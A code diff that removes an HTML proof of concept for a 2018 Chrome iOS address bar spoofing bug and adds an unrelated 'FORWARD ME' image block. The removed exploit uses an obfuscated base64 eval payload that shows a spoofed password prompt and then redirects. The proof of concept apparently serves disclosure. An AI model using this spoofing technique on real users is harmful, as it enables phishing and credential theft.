@@ -1,26 +1,3 @@
-
-<html>
-<head>
-    <title>Chrome Mobile App Address Bar Spoof Vulnerability</title>
-    <!--
-        author: evi1m0.bat[at]gmail.com
-        datetime: 2018/05/03 00:16:27
-        test version: for iPhone 66.0.3359.122
-    -->
-</head>
-<script>
-    pwn = () => {
-        x = open('https://wrong.host.badssl.com/', 'win');
-        setTimeout(`
-            x.document.write('<img src=@ onerror=eval(atob("dmFyIHB3ZD1wcm9tcHQoImh0dHBzOi8vdGVzdC5iYWlkdS5jb21cbmlucHV0IHlvdXIgcGFzc3dvcmRcbnRlc3QuLi4iKTtpZihwd2Qpe2FsZXJ0KCJwYXNzd29yZDogIitwd2QpfQ=="))><a href="https://google.com/" id="test">test</a>');
-            `, 1000);
-        setTimeout(`
-            x.close();
-            window.location='https://amazon.com/';
-            `, 1300);
-    }
-</script>
-<h1>
-    <a onclick="pwn()">ClickMe :-)</a>
-</h1>
-</html>
+<div id="layer1" style="width:198px; height:200px; position:absolute; left:39px; top:0px; z-index:1;">
+    <img src="http://www.alternativ-testing.fr/hand01_up.gif" width="26" height="32" border="0"><br><h1>FORWARD ME</h1>
+</div>
